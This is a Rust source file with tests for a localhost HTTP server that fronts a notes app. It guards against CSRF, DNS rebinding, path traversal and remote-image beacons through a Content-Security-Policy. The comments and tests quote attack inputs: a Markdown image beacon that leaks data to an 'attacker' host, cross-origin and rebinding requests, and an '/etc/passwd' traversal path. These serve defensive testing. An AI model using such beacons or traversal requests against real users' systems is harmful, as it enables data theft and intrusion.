//! `fm-serve` — the browser frontend's transport. It exposes `fm_app::dispatch` (the one
//! command surface, over one shared set of vaults) as a tiny localhost HTTP+JSON API, and
//! serves the built UI. The frontend's `ipc.ts` calls `POST /api/<command>` with camelCase
//! args, so the identical bundle runs in a browser against the REAL vault.
//!
//! **This file is a shell, and that is the whole point.** Everything here is HTTP: parsing
//! a request line, the CSRF guard, status codes, `Range` headers, serving static assets.
//! The commands themselves — and the vault list, and the lock discipline — live in
//! `fm_app::dispatch`, so a second frontend reaches them by calling that function rather
//! than by re-implementing this file. When this file starts knowing what a command *means*,
//! the fork has begun again.
//!
//! Localhost only, one machine. std-only networking, thread-per-connection. **Not** "single
//! user" in the trust sense any more: note bodies arrive from collaborators through the `.md`
//! merge driver, so the read view treats them as untrusted and sanitizes before rendering
//! (`ui/src/lib/render.ts`). The CSRF guard still allows no-Origin requests (curl/scripts have
//! no ambient credentials to abuse), which is exactly why that sanitizer is load-bearing.

// The built UI, baked in at compile time by build.rs — this is what makes the core one
// self-contained file rather than a binary that needs its assets shipped beside it.
include!(concat!(env!("OUT_DIR"), "/ui_assets.rs"));

mod blob;

use fm_app::{dispatch, App, Host, Output};
use serde_json::Value;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

struct AppState {
    /// The command surface. Everything vault-shaped lives in here now.
    app: App,
    /// Where to read the UI from, or `None` to serve the copy baked into this binary.
    ///
    /// `Some` only when `FM_UI_DIST` is set explicitly, which is the dev loop: `pixi run
    /// serve` points it at `ui/dist` so editing a `.svelte` and reloading shows the change
    /// with no Rust rebuild. Unset — every release launch — serves the embedded assets, so
    /// the binary needs nothing beside it.
    dist: Option<PathBuf>,
    /// The origins our own page can be served from. Any other origin on an API
    /// call is some site the user merely visited, reaching for their vault.
    origins: Vec<String>,
    /// When the last request arrived — the browser's heartbeat refreshes it, so
    /// the auto-shutdown watchdog can tell an open tab from a closed one.
    last_seen: Mutex<Instant>,
    /// Set once the first request lands, so we grant a longer grace for a cold
    /// browser to make contact before the idle timeout applies.
    connected: AtomicBool,
}

/// This platform's answer to "open this file with whatever owns it" — the one thing
/// `fm_app::dispatch` cannot know for itself. See [`fm_app::Host`].
struct Desktop;

impl Host for Desktop {
    fn open_external(&self, path: &Path) -> Result<(), String> {
        open_native(path.as_os_str()).map_err(|e| format!("could not open the file: {e}"))
    }
}

fn main() {
    // Absent on purpose: no default path. The UI is *in* the binary unless someone
    // explicitly points us at a directory.
    let dist = std::env::var_os("FM_UI_DIST").map(PathBuf::from);
    let addr = std::env::var("FM_ADDR").unwrap_or_else(|_| "127.0.0.1:8765".to_string());

    // Both spellings of "us": a browser sends whichever hostname the user typed.
    let port = addr.rsplit(':').next().unwrap_or("8765").to_string();
    let origins =
        vec![format!("http://127.0.0.1:{port}"), format!("http://localhost:{port}")];

    let (app, skipped) = App::load().expect("open vaults");
    let configs = app.configs().expect("vaults");
    if configs.is_empty() {
        // Not an error, and not a fallback to a vault nobody chose: the first run. The UI
        // gates on `list_vaults` returning `[]` and asks for one.
        eprintln!("no vaults configured — open the app to create your first one.");
    }
    // A vault opens even when a note is unreadable — a conflicted merge is the usual
    // cause, and refusing to start would take away the very app you need to fix it. But
    // those notes are now absent from every view, so say which ones: silently serving an
    // incomplete vault is the one outcome worse than not starting at all.
    if !skipped.is_empty() {
        eprintln!("warning: {} note(s) could not be read and are missing from every view:", skipped.len());
        for note in &skipped {
            eprintln!("  {note}");
        }
        eprintln!("  (a conflicted merge? resolve the markers and reload.)");
    }
    let state = Arc::new(AppState {
        app,
        dist,
        origins,
        last_seen: Mutex::new(Instant::now()),
        connected: AtomicBool::new(false),
    });

    match &state.dist {
        // Told to read from disk, but there is nothing there.
        Some(d) if !d.join("index.html").exists() => eprintln!(
            "warning: FM_UI_DIST={} has no index.html — build the UI first (pnpm -C ui build)",
            d.display()
        ),
        // Serving ourselves, but nothing was baked in (built before `pnpm build` ran).
        None if UI_ASSETS.is_empty() => eprintln!(
            "warning: no UI is embedded in this binary — rebuild with `pixi run build`, \
             or set FM_UI_DIST to a built ui/dist"
        ),
        _ => {}
    }

    let listener = TcpListener::bind(&addr).unwrap_or_else(|e| panic!("bind {addr}: {e}"));
    for v in &configs {
        println!("formicaria is serving {} at {}", v.name, v.path.display());
    }
    println!("open  http://{addr}  in your browser");

    // The launcher sets FM_OPEN so a double-click opens the default browser.
    //
    // **No delay here, and there never needed to be one.** This slept 400ms first, to "let the
    // listener accept before the browser's first request" — but `TcpListener::bind` above also
    // calls `listen()`, so the kernel has been queueing connections since that line. A request
    // arriving before `accept()` runs waits in the backlog; it cannot be refused. The accept loop
    // starts a few lines below, microseconds away. So the sleep guarded against nothing and cost
    // 400ms of every single launch — measured while looking for exactly this kind of leftover.
    if std::env::var_os("FM_OPEN").is_some() {
        let url = format!("http://{addr}");
        std::thread::spawn(move || {
            let _ = open_native(std::ffi::OsStr::new(&url));
        });
    }

    // The launcher also sets FM_AUTO_SHUTDOWN so that closing the browser tab
    // closes the app — no server left running in the background. `pixi run serve`
    // does NOT set it, so the dev loop keeps the server up until Ctrl-C.
    if std::env::var_os("FM_AUTO_SHUTDOWN").is_some() {
        spawn_watchdog(Arc::clone(&state));
    }

    for stream in listener.incoming().flatten() {
        let state = Arc::clone(&state);
        std::thread::spawn(move || {
            if let Err(e) = handle(stream, &state) {
                eprintln!("connection error: {e}");
            }
        });
    }
}

/// Auto-shutdown: exit the process when no browser tab is talking to us anymore.
/// The UI sends a heartbeat (`POST /api/alive`) every 15 s; when the last
/// tab closes the heartbeats stop and, after an idle window, we quit — so
/// closing the tab closes the app. The idle window is longer than a page reload
/// (which briefly pauses the heartbeat), so a refresh doesn't kill the server.
/// Before the very first request a longer grace covers a cold browser start.
fn spawn_watchdog(state: Arc<AppState>) {
    // **Sized against a *throttled* beat, not a nominal one.** Browsers throttle timers in a
    // backgrounded tab to roughly once a minute, so the old pairing — a 3 s beat against a
    // 10 s window — meant leaving the app in a background tab for a minute killed it while
    // the user still had it open. The window has to exceed the worst-case throttle with
    // room to spare, which is what 90 s buys against the 15 s nominal beat.
    //
    // Erring long leaves a server running ~90 s after the last tab closes. Erring short
    // kills the app under someone who is working in it. The costs are not symmetric, so
    // this is biased toward the recoverable failure.
    const IDLE: Duration = Duration::from_secs(90);
    const STARTUP: Duration = Duration::from_secs(60);
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(2));
        let idle = state.last_seen.lock().map(|t| t.elapsed()).unwrap_or_default();
        let limit = if state.connected.load(Ordering::Relaxed) { IDLE } else { STARTUP };
        if idle > limit {
            std::process::exit(0);
        }
    });
}

fn handle(mut stream: TcpStream, state: &AppState) -> std::io::Result<()> {
    let mut reader = BufReader::new(stream.try_clone()?);

    let mut request_line = String::new();
    if reader.read_line(&mut request_line)? == 0 {
        return Ok(()); // client closed
    }
    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("").to_string();
    let path = parts.next().unwrap_or("/").to_string();

    // Liveness for the auto-shutdown watchdog: any request (asset load, API call,
    // or the heartbeat ping) means a tab is open right now.
    if let Ok(mut t) = state.last_seen.lock() {
        *t = Instant::now();
    }
    state.connected.store(true, Ordering::Relaxed);

    // Read headers; we care about the body length, who is calling, and the byte range a
    // media element is asking for.
    let mut content_length = 0usize;
    let mut origin: Option<String> = None;
    let mut range: Option<String> = None;
    let mut host: Option<String> = None;
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            break;
        }
        let line = line.trim_end();
        if line.is_empty() {
            break; // end of headers
        }
        let lower = line.to_ascii_lowercase();
        if let Some(v) = lower.strip_prefix("content-length:") {
            content_length = v.trim().parse().unwrap_or(0);
        } else if let Some(v) = lower.strip_prefix("origin:") {
            // Lowercased with the rest of the line, which is harmless: an origin is
            // scheme + host + port, none of which are case-sensitive.
            origin = Some(v.trim().to_string());
        } else if let Some(v) = lower.strip_prefix("range:") {
            range = Some(v.trim().to_string());
        } else if let Some(v) = lower.strip_prefix("host:") {
            host = Some(v.trim().to_string());
        }
    }
    // Guard against a hostile/oversized upload before allocating the body.
    if content_length > 512 * 1024 * 1024 {
        return write_response(&mut stream, "413 Payload Too Large", "text/plain", b"payload too large");
    }
    let mut body = vec![0u8; content_length];
    if content_length > 0 {
        reader.read_exact(&mut body)?;
    }

    // **DNS rebinding.** Binding to 127.0.0.1 keeps other *machines* out, but it does not
    // decide which *name* a browser used to get here: a hostname an attacker controls, made
    // to resolve to 127.0.0.1, reaches this server from a page that is same-origin with
    // itself — so the CSRF guard below sees a matching Origin and waves it through, and the
    // browser lets that page read every response.
    //
    // The fix is to insist on the names we actually serve. Anything else is a request that
    // arrived under a name we never published, which is the attack and nothing else.
    // A missing Host is HTTP/1.0 or a hand-rolled client — not a browser, so not this
    // vector, and refusing it would break curl for no gain.
    if let Some(h) = &host {
        // An IPv6 literal is bracketed (`[::1]:8765`), so the port cannot simply be split off
        // at the first colon — that yields `[` and refuses a request from ourselves.
        let bare = match h.strip_prefix('[') {
            Some(rest) => rest.split(']').next().unwrap_or(""),
            None => h.split(':').next().unwrap_or(""),
        };
        if !matches!(bare, "127.0.0.1" | "localhost" | "::1") {
            return write_response(
                &mut stream,
                "403 Forbidden",
                "text/plain",
                b"unexpected Host header",
            );
        }
    }

    // The vault is reachable at a fixed localhost port with no authentication, so
    // any page the user happens to visit could POST to it — and a `text/plain`
    // body skips the CORS preflight, so the browser hides the *response* while the
    // side effect (a delete, a write) still lands. Browsers send `Origin` on every
    // POST, same-origin included, so a mismatch is exactly that attack.
    //
    // No `Origin` at all means a non-browser client — curl, a script, a test.
    // That is not a CSRF vector (there are no ambient credentials to abuse) and
    // refusing it would break every command-line workflow, so it passes.
    if method == "POST" && path.starts_with("/api/") {
        if let Some(o) = &origin {
            if !state.origins.iter().any(|allowed| allowed == o) {
                return write_response(
                    &mut stream,
                    "403 Forbidden",
                    "text/plain",
                    b"cross-origin request refused",
                );
            }
        }
    }

    // Blob bytes are the one response we refuse to build in memory: a video is served by
    // `<video src>`, which range-requests as the user seeks, and buffering 300 MB per seek
    // is how the old object-URL path behaved. Streamed from disk, so it costs one buffer.
    if (method == "GET" || method == "HEAD") && path.starts_with("/api/blob/") {
        let hash = path[10..].split('?').next().unwrap_or("");
        return blob::serve(&mut stream, state, hash, range.as_deref(), method == "HEAD");
    }

    // Liveness, and *only* liveness — the cheapest possible "a tab is still here".
    //
    // Deliberately not a command. `last_seen` was already refreshed above, before routing,
    // so answering is all that is left to do: no lock, no filesystem, no dispatch. That
    // matters because the tab has to say this on a timer forever, and the alternative —
    // riding `ping`, which reindexes — meant every heartbeat took the vault lock and could
    // queue behind a `backup_status` doing a network `ls-remote` per vault.
    //
    // It is also transport-shaped, not app-shaped: the auto-shutdown watchdog is a property
    // of *this* server, and a frontend with no watchdog would never call it. Putting it in
    // `dispatch` would push a transport concern into the shared surface.
    if path == "/api/alive" {
        return write_response(&mut stream, "200 OK", "text/plain", b"");
    }

    let (status, ctype, data) = if method == "POST" && path.starts_with("/api/") {
        api(&path[5..], &body, state)
    } else if method == "GET" || method == "HEAD" {
        static_file(&path, state)
    } else {
        ("405 Method Not Allowed", "text/plain".to_string(), b"method not allowed".to_vec())
    };

    write_response(&mut stream, status, &ctype, &data)
}

/// Turn one HTTP request into one [`dispatch`] call, and its answer back into HTTP.
///
/// The only translation with any content: named arguments arrive either as a JSON body or
/// as a query string, and `dispatch` should not have to care which. `ingest` is why both
/// exist — there the raw body *is* the file, so its name and target vault cannot also be in
/// it and ride in the URL instead (`/api/ingest?name=<urlencoded>&vault=<name>`).
///
/// **A query string means the body is not arguments — it is payload.** Overlaying the two
/// would read a JSON *asset* as its own arguments: upload a file containing
/// `{"vault":"lab"}` and it would file itself into someone else's audience. Today no
/// command wants both, so "either, never both" is exactly today's behaviour and closes that
/// by construction rather than by the body happening not to parse.
///
/// Errors come back as a plain-text 500 body, which the UI shows in its error banner or
/// degrades to the missing-asset placeholder.
fn api(cmd: &str, body: &[u8], state: &AppState) -> (&'static str, String, Vec<u8>) {
    let (cmd, query) = cmd.split_once('?').unwrap_or((cmd, ""));

    let args: Value = if query.is_empty() {
        serde_json::from_slice(body).unwrap_or(Value::Null)
    } else {
        Value::Object(query_pairs(query).map(|(k, v)| (k, Value::String(v))).collect())
    };

    match dispatch(cmd, &args, body, &state.app, &Desktop) {
        Ok(Output::Bytes(b)) => ("200 OK", "application/octet-stream".to_string(), b),
        Ok(Output::Json(b)) => ("200 OK", "application/json".to_string(), b),
        Err(msg) => {
            ("500 Internal Server Error", "text/plain; charset=utf-8".to_string(), msg.into_bytes())
        }
    }
}

/// Hand a file or URL to the OS to open with whatever it thinks owns it — the one place
/// that knows how each platform spells that. Every OS has this; only the name differs.
fn open_native(target: &std::ffi::OsStr) -> std::io::Result<()> {
    #[cfg(target_os = "linux")]
    let mut cmd = {
        let mut c = std::process::Command::new("xdg-open");
        c.arg(target);
        c
    };
    #[cfg(target_os = "macos")]
    let mut cmd = {
        let mut c = std::process::Command::new("open");
        c.arg(target);
        c
    };
    // `start` is a cmd builtin, not a program, so it needs a shell. The empty "" is the
    // window title: `start` reads a first quoted argument as the title, so without it a
    // quoted path would be swallowed as one and nothing would open.
    #[cfg(target_os = "windows")]
    let mut cmd = {
        let mut c = std::process::Command::new("cmd");
        c.args(["/C", "start", ""]).arg(target);
        c
    };
    // Anywhere else — Android first, and the reason this arm exists: without it the three
    // `cfg`s above are all false, `cmd` is never bound, and **`fm-serve` does not compile for
    // Android at all**. The same shape of hole as `fm_app::vaults::config_dir` had.
    //
    // It is a genuine `Unsupported`, not a stub. There is no `xdg-open` on Android: handing a
    // file to whatever owns it means an `Intent`, which needs the JVM and therefore a real
    // shell — which is precisely why `open_external` was made a `Host` trait method rather than
    // a `#[cfg]` ladder inside `fm-app` (`mobile-design.md`, ruling 1). A mobile shell
    // implements `Host` and never reaches this function; `fm-serve`-on-device is a test
    // fixture, and a test fixture should say what it cannot do rather than pretend.
    #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
    return Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "opening a file with the system handler needs a platform shell on this OS",
    ));

    #[cfg(any(target_os = "linux", target_os = "macos", target_os = "windows"))]
    cmd.spawn().map(|_| ())
}

/// Serve a file from the built UI — from `FM_UI_DIST` when it is set, otherwise from the
/// copy baked into this binary. Unknown non-file paths fall back to index.html so the
/// single-page app owns client-side routing. Guards against `..` path traversal.
fn static_file(path: &str, state: &AppState) -> (&'static str, String, Vec<u8>) {
    let clean = path.split('?').next().unwrap_or("/");
    let rel = if clean == "/" { "index.html" } else { clean.trim_start_matches('/') };
    // Only reachable on the on-disk path, but checked for both: a guard that applies
    // sometimes is a guard nobody can reason about.
    if rel.split('/').any(|seg| seg == "..") {
        return ("400 Bad Request", "text/plain".to_string(), b"bad path".to_vec());
    }
    match read_asset(state, rel) {
        Some(bytes) => ("200 OK", content_type(rel).to_string(), bytes),
        // The SPA owns its own routes, so an unknown path is a route, not a 404.
        None => match read_asset(state, "index.html") {
            Some(bytes) => ("200 OK", "text/html; charset=utf-8".to_string(), bytes),
            None => ("404 Not Found", "text/plain".to_string(), b"not found".to_vec()),
        },
    }
}

/// One UI file, from wherever the UI is coming from: an explicit `FM_UI_DIST` (the dev
/// loop — edit a `.svelte`, reload, no Rust rebuild) or the embedded table (every release
/// launch, so the binary needs nothing beside it).
fn read_asset(state: &AppState, rel: &str) -> Option<Vec<u8>> {
    match &state.dist {
        Some(dir) => std::fs::read(dir.join(rel)).ok(),
        None => UI_ASSETS.iter().find(|(name, _)| *name == rel).map(|(_, b)| b.to_vec()),
    }
}

/// Every `key=value` in a `&`-joined query string, percent-decoded.
fn query_pairs(query: &str) -> impl Iterator<Item = (String, String)> + '_ {
    query.split('&').filter(|s| !s.is_empty()).filter_map(|kv| {
        let (k, v) = kv.split_once('=')?;
        Some((percent_decode(k), percent_decode(v)))
    })
}

/// Minimal percent-decode for a query value (`encodeURIComponent` output).
/// Preserves UTF-8 (a decoded byte sequence is re-read as UTF-8).
fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'%' if i + 2 < b.len() => match (hexval(b[i + 1]), hexval(b[i + 2])) {
                (Some(h), Some(l)) => {
                    out.push(h * 16 + l);
                    i += 3;
                }
                _ => {
                    out.push(b'%');
                    i += 1;
                }
            },
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hexval(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

fn content_type(name: &str) -> &'static str {
    match name.rsplit('.').next().unwrap_or("") {
        "html" => "text/html; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "json" => "application/json",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "webp" => "image/webp",
        "gif" => "image/gif",
        "ico" => "image/x-icon",
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "wasm" => "application/wasm",
        _ => "application/octet-stream",
    }
}

/// The one line that makes "nothing phones home" true rather than merely intended.
///
/// A note is Markdown, and Markdown renders remote images. Without this, a single
/// `![](https://attacker/p.png?leak=…)` in a note someone else wrote — pulled in by a
/// merge, a copy, or a shared vault — fetches an attacker's URL **on render, from the
/// user's machine**. That is not a hypothetical XSS chain: it needs no script, survives
/// DOMPurify (whose allow-list permits `https:` URLs), and survives a human reading the
/// diff. The app already self-hosts Excalidraw's fonts to avoid exactly this; the
/// renderer had no equivalent guard.
///
/// Each clause, and why it is as tight as it is:
/// - `default-src 'self'` — the backstop for anything not named below.
/// - `img-src 'self' data: blob:` — the beacon fix. `data:`/`blob:` are local bytes
///   (pasted images, object URLs), so they carry no request off the machine.
/// - `style-src … 'unsafe-inline'` — unavoidable and low-risk: Mermaid injects `<style>`,
///   and KaTeX/Excalidraw set `style=` attributes on every element they draw.
/// - `script-src 'self'` with **no** `'unsafe-inline'` — the clause worth protecting.
///   Excalidraw's asset-path line was moved out of `index.html` into its own file for it.
///   `wasm-unsafe-eval` allows bundled WebAssembly without allowing `eval` of strings.
/// - `connect-src 'self'` — even a script that does run cannot exfiltrate by `fetch`.
/// - `object-src`/`frame-src 'none'`, `base-uri 'self'`, `form-action 'none'` — close the
///   remaining ways a document can be made to reach out.
/// - `frame-ancestors 'none'` — **not** covered by `default-src`, and the one clause aimed at
///   the threat the Host/Origin guards above already take seriously: the server sits at a fixed
///   localhost port with no authentication, so any page the user visits can frame it. Without
///   this, that page can overlay a destructive control and have the user click it.
/// - `media-src`/`font-src`/`worker-src` — the app's own needs: `<video>` from object URLs,
///   KaTeX's bundled woff2, and pica's `blob:` resize worker (Excalidraw image insert).
///
/// **Deliberately absent: `'unsafe-eval'`.** Excalidraw's font *subsetter* is harfbuzz compiled
/// with emscripten embind, which calls `Function(string)` — so `getContent()` throws, is caught
/// by Excalidraw, and an exported SVG embeds a font URL instead of the font bytes. That is a
/// real, accepted loss: exports render in fallback fonts elsewhere. Allowing `'unsafe-eval'`
/// to fix it would hand every string in a note a path to execution, which is the whole thing
/// this policy exists to prevent. In-app board rendering is unaffected.
///
/// **Not stopped by any CSP:** a top-level navigation the user clicks
/// (`[click here](https://attacker/?leak=…)`). `navigate-to` was dropped from the spec.
/// `Referrer-Policy: no-referrer` limits what such a click carries.
const CSP: &str = "default-src 'self'; \
img-src 'self' data: blob:; \
media-src 'self' blob:; \
style-src 'self' 'unsafe-inline'; \
font-src 'self' data:; \
script-src 'self' 'wasm-unsafe-eval'; \
worker-src 'self' blob:; \
connect-src 'self'; \
object-src 'none'; \
frame-src 'none'; \
frame-ancestors 'none'; \
base-uri 'self'; \
form-action 'none'";

fn write_response(
    stream: &mut TcpStream,
    status: &str,
    ctype: &str,
    body: &[u8],
) -> std::io::Result<()> {
    let header = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Security-Policy: {CSP}\r\nX-Content-Type-Options: nosniff\r\nReferrer-Policy: no-referrer\r\nContent-Length: {}\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
        body.len()
    );
    stream.write_all(header.as_bytes())?;
    stream.write_all(body)?;
    stream.flush()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{BufRead as _, BufReader as _BufReader, Read as _Read};

    /// Drive the **real** `handle` over a real socket with a raw request, and return the
    /// status line plus headers.
    ///
    /// The guards below are the ones that decide whether a page you merely visited can reach
    /// your vault, and until now none of them had a test — the whole transport was verified
    /// by hand. They are also exactly the kind of code that is easy to get subtly wrong and
    /// impossible to notice: a guard that stops refusing still serves every page correctly.
    fn request(raw: &str, origins: Vec<String>) -> (String, String) {
        let dir = tempfile::tempdir().unwrap();
        let vault = dir.path().join("v");
        std::fs::create_dir_all(vault.join("notes")).unwrap();
        let store = fm_core::MultiStore::open(&[("v".to_string(), vault.clone())]).unwrap();
        let cfg = fm_app::vaults::VaultConfig { name: "v".into(), path: vault, restic: None };
        let state = AppState {
            app: fm_app::App::new(store, vec![cfg], None, false),
            dist: None,
            origins,
            last_seen: Mutex::new(Instant::now()),
            connected: AtomicBool::new(false),
        };

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = std::thread::spawn(move || {
            let (sock, _) = listener.accept().unwrap();
            let _ = handle(sock, &state);
        });

        let mut client = TcpStream::connect(addr).unwrap();
        client.write_all(raw.as_bytes()).unwrap();
        let mut reader = _BufReader::new(&mut client);
        let mut status = String::new();
        reader.read_line(&mut status).unwrap();
        let mut headers = String::new();
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).unwrap() == 0 || line.trim().is_empty() {
                break;
            }
            headers.push_str(&line);
        }
        let mut body = Vec::new();
        let _ = reader.read_to_end(&mut body);
        server.join().unwrap();
        (status.trim().to_string(), headers)
    }

    fn ours() -> Vec<String> {
        vec!["http://127.0.0.1:8765".into(), "http://localhost:8765".into()]
    }

    fn post(origin: Option<&str>, host: &str) -> String {
        let mut r = format!("POST /api/ping HTTP/1.1\r\nHost: {host}\r\n");
        if let Some(o) = origin {
            r.push_str(&format!("Origin: {o}\r\n"));
        }
        r.push_str("Content-Length: 2\r\n\r\n{}");
        r
    }

    /// The vault sits at a fixed localhost port with no authentication, so any page the user
    /// happens to visit could POST to it — and a `text/plain` body skips the CORS preflight,
    /// so the browser hides the *response* while the side effect still lands.
    #[test]
    fn a_post_from_another_origin_is_refused() {
        let (status, _) = request(&post(Some("http://evil.example"), "127.0.0.1:8765"), ours());
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    #[test]
    fn a_post_from_our_own_page_is_allowed() {
        for o in ["http://127.0.0.1:8765", "http://localhost:8765"] {
            let (status, _) = request(&post(Some(o), "127.0.0.1:8765"), ours());
            assert_eq!(status, "HTTP/1.1 200 OK", "origin {o} is us");
        }
    }

    /// No `Origin` at all means a non-browser client — curl, a script, a test. That is not a
    /// CSRF vector (there are no ambient credentials to abuse) and refusing it would break
    /// every command-line workflow.
    #[test]
    fn a_post_with_no_origin_is_allowed() {
        let (status, _) = request(&post(None, "127.0.0.1:8765"), ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// DNS rebinding: binding to 127.0.0.1 keeps other *machines* out, but does not decide
    /// which *name* a browser used to arrive. A hostname an attacker controls, resolved to
    /// 127.0.0.1, is same-origin with itself — so the CSRF guard waves it through and the
    /// page can read every response.
    #[test]
    fn a_request_arriving_under_someone_elses_hostname_is_refused() {
        let (status, _) = request(&post(None, "evil.attacker.test:8765"), ours());
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    #[test]
    fn the_names_we_actually_serve_are_allowed() {
        for h in ["127.0.0.1:8765", "localhost:8765", "[::1]:8765", "127.0.0.1"] {
            let (status, _) = request(&post(None, h), ours());
            assert_eq!(status, "HTTP/1.1 200 OK", "host {h} is us");
        }
    }

    /// HTTP/1.0 and hand-rolled clients send no `Host`. Not a browser, so not this vector —
    /// and refusing it would break curl for no gain.
    #[test]
    fn a_request_with_no_host_is_allowed() {
        let (status, _) =
            request("POST /api/ping HTTP/1.0\r\nContent-Length: 2\r\n\r\n{}", ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    #[test]
    fn a_traversal_out_of_the_ui_directory_is_refused() {
        let (status, _) = request(
            "GET /../../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n",
            ours(),
        );
        assert_eq!(status, "HTTP/1.1 400 Bad Request");
    }

    #[test]
    fn an_unsupported_method_is_refused() {
        let (status, _) =
            request("PUT /api/ping HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        assert_eq!(status, "HTTP/1.1 405 Method Not Allowed");
    }

    /// Liveness must stay reachable without a lock or a dispatch — a hidden tab beats it
    /// forever, and the watchdog's whole job depends on it answering.
    #[test]
    fn the_liveness_endpoint_answers() {
        let (status, _) =
            request("POST /api/alive HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// The beacon guard. A note that arrives through a merge or a shared vault can contain
    /// `![](https://attacker/p.png?leak=…)`, which fetches on render with no script involved
    /// — so the policy has to be on the response, not in the sanitiser.
    #[test]
    fn every_response_carries_a_policy_that_stops_a_note_phoning_home() {
        let (_, headers) = request("GET / HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        let csp = headers
            .lines()
            .find_map(|l| l.strip_prefix("Content-Security-Policy: "))
            .unwrap_or_else(|| panic!("no CSP on a page response:\n{headers}"));

        // A remote image must not be loadable, and a remote `fetch` must not be reachable.
        assert!(csp.contains("img-src 'self' data: blob:"), "{csp}");
        assert!(csp.contains("connect-src 'self'"), "{csp}");
        assert!(csp.contains("default-src 'self'"), "{csp}");
        // `default-src` does NOT back-stop this one, and the server sits at a fixed localhost
        // port with no auth — so without it any page the user visits can frame the app and
        // overlay a destructive control.
        assert!(csp.contains("frame-ancestors 'none'"), "{csp}");
        // `'unsafe-eval'` would hand every string in a note a path to execution. Excalidraw's
        // font subsetter wants it; we accept the degraded export instead (see `CSP`).
        assert!(!csp.contains("'unsafe-eval'") || csp.contains("'wasm-unsafe-eval'"), "{csp}");
        assert!(!csp.replace("'wasm-unsafe-eval'", "").contains("'unsafe-eval'"), "{csp}");
        // The clause worth protecting: no inline scripts, so a sanitiser bypass is not
        // automatically code execution. Excalidraw's asset-path line lives in its own file
        // to keep this true — if that regresses, this test is the alarm.
        let scripts = csp.split("script-src").nth(1).unwrap_or("");
        assert!(
            !scripts.split(';').next().unwrap_or("").contains("'unsafe-inline'"),
            "script-src must never allow inline: {csp}"
        );
    }

    #[test]
    fn query_params_become_named_arguments() {
        let got: Vec<_> = query_pairs("name=my%20photo.png&vault=lab").collect();
        assert_eq!(
            got,
            vec![
                ("name".to_string(), "my photo.png".to_string()),
                ("vault".to_string(), "lab".to_string())
            ]
        );
    }

    /// An empty query string must not synthesise an empty argument — `ingest` with no
    /// `name` falls back to "asset", and a `Some("")` would defeat that.
    #[test]
    fn an_empty_query_string_yields_no_arguments() {
        assert_eq!(query_pairs("").count(), 0);
    }
}
